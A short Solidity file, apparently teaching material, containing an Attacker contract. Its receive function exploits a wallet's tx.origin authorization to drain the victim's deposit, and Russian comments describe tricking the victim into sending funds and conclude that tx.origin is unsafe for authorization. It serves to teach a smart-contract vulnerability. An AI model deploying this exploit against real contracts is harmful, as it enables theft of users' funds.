// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

interface IDepositWallet {
    function transferFunds(address payable _to, uint256 _amount) external;
}

contract Attacker {
    address payable attacker;

    constructor() {
        attacker = payable(msg.sender);
    }

    receive() external payable {
        IDepositWallet(msg.sender).transferFunds(attacker, msg.sender.balance);
    }

    // КАК ПРОИСХОДИТ АТАКА:

    // ЖЕРТВА ИМЕЕТ ДЕПОЗИТ в DepositWallet
    // ХАКЕР разворачивает Attacker контракт
    // ПРОСИТ ЖЕРТВУ ПЕРЕВЕСТИ любую сумму на Attacker контракт
    // ЖЕРТВА ПЕРЕВОДИТ ДЕНЬГИ...
    // Отрабатывает функция receive

    // ВЫВОДЫ:
    // не используем tx.origin для авторизации
}
